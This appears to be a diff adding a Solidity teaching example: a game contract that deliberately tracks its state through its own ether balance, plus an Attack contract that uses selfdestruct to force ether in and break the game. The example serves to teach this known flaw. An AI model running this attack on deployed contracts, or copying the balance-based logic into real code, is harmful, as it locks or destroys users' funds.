@@ -1,0 +1,40 @@
+pragma solidity ^0.8.13;
+contract GameVictim {
+    uint public targetAmount = 10 ether;
+    address public winner;
+
+    function deposit() public payable {
+        require(msg.value == 1 ether, "You can only send 1 Ether");
+
+        uint balances = address(this).balance;
+        require(balances <= targetAmount, "Game is over");
+
+        if (balances == targetAmount) {
+            winner = msg.sender;
+        }
+    }
+
+    function claimReward() public {
+        require(msg.sender == winner, "Not a winner");
+
+        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
+        require(sent, "Failed to send Reward");
+    }
+}
+
+contract Attack {
+    GameVictim gameVictim;
+
+    constructor(GameVictim _gameVictim) {
+        gameVictim = GameVictim(_gameVictim);
+    }
+
+    function attack() public payable {
+        // You can simply break the game by sending ether so that
+        // the game balance >= 10 ether
+
+        // cast address to payable
+        address payable attacker = payable(address(gameVictim));
+        selfdestruct(attacker);
+    }
+}
